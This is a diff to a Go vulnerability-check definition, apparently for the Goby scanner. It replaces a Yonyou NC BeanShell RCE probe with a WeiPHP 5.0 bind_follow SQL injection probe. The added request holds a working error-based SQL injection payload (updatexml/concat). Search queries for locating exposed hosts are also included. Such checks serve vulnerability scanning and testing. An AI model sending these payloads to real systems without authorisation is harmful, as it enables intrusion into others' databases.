@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "WeiPHP5.0 bind_follow SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"WeiPHP\" || product=\"WeiPHP\"",
+  "GobyQuery": "app=\"WeiPHP\" || product=\"WeiPHP\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -30,7 +30,7 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(%271%27),0x7e),1)--+",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -42,16 +42,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "c4ca4238a0b923820dcc509",
             "bz": ""
           }
         ]
@@ -107,7 +100,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "WeiPHP5.0 bind_follow SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +109,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "WeiPHP5.0 bind_follow SQL injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
